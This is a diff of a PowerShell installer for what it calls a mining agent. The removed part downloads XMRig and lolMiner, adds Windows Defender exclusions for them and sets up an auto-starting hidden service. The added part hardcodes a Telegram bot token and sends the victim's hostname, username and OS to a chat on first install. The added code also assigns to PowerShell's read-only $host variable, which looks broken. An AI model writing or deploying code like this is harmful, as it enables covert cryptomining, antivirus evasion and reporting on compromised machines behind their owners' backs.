@@ -1,52 +1,42 @@
 # ===== SAFETY =====
 if ($env:ALLOW_MINING -ne "1") { exit }
 
-# ===== PATHS =====
+# ===== TELEGRAM =====
+$TG_TOKEN = "8556429231:AAFBKuMMfkrpnxJInSITVaBUD8prYuHcnLw"
+$TG_CHAT  = "5336452267"
+
+function Send-TG($text) {
+    Invoke-RestMethod `
+        -Uri "https://api.telegram.org/bot$TG_TOKEN/sendMessage" `
+        -Method POST `
+        -Body @{
+            chat_id = $TG_CHAT
+            text    = $text
+        } `
+        -ErrorAction SilentlyContinue
+}
+
+# ===== PATH =====
 $BASE = "$env:APPDATA\.mining"
-$BIN  = "$BASE\bin"
-$LOG  = "$BASE\log"
-New-Item -ItemType Directory -Force -Path "$BIN\cpu","$BIN\gpu","$LOG" | Out-Null
+New-Item -ItemType Directory -Force -Path $BASE | Out-Null
 
-# ===== DOWNLOADS =====
-$xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-msvc-win64.zip"
-$lolUrl   = "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Win64.zip"
-
-function Get-Zip($url, $dest) {
-    $tmp = "$env:TEMP\pkg.zip"
-    Invoke-WebRequest $url -OutFile $tmp -UseBasicParsing
-    Expand-Archive $tmp $dest -Force
-    Remove-Item $tmp -Force
+# ===== ONE-TIME MARKER =====
+$marker = "$BASE\installed.flag"
+if (Test-Path $marker) {
+    exit
 }
 
-if (-not (Test-Path "$BIN\cpu\xmrig.exe")) {
-    Get-Zip $xmrigUrl "$BIN\cpu"
-}
+# ===== MESSAGE =====
+$host = $env:COMPUTERNAME
+$user = $env:USERNAME
+$os   = (Get-CimInstance Win32_OperatingSystem).Caption
 
-if (-not (Test-Path "$BIN\gpu\lolMiner.exe")) {
-    Get-Zip $lolUrl "$BIN\gpu"
-}
+Send-TG "🪟 Windows агент установлен
 
-# ===== DEFENDER EXCLUSIONS =====
-try {
-    Add-MpPreference -ExclusionPath $BASE
-    Add-MpPreference -ExclusionProcess "$BIN\cpu\xmrig.exe"
-    Add-MpPreference -ExclusionProcess "$BIN\gpu\lolMiner.exe"
-} catch {}
+Host: $host
+User: $user
+OS: $os
+Time: $(Get-Date)"
 
-# ===== INSTALL SERVICE (NSSM) =====
-$NSSM = "$BASE\nssm.exe"
-if (-not (Test-Path $NSSM)) {
-    Invoke-WebRequest "https://nssm.cc/release/nssm-2.24.zip" -OutFile "$env:TEMP\nssm.zip"
-    Expand-Archive "$env:TEMP\nssm.zip" "$env:TEMP\nssm" -Force
-    Copy-Item "$env:TEMP\nssm\nssm-2.24\win64\nssm.exe" $NSSM -Force
-}
-
-$svc = "MiningAgent"
-& $NSSM stop $svc 2>$null
-& $NSSM remove $svc confirm 2>$null
-
-& $NSSM install $svc "powershell.exe" "-NoProfile -ExecutionPolicy Bypass -File `"$PSScriptRoot\agent.ps1`""
-& $NSSM set $svc Start SERVICE_AUTO_START
-& $NSSM set $svc AppStdout "$LOG\agent.out.log"
-& $NSSM set $svc AppStderr "$LOG\agent.err.log"
-& $NSSM start $svc
+# ===== MARK INSTALLED =====
+New-Item -ItemType File -Path $marker | Out-Null
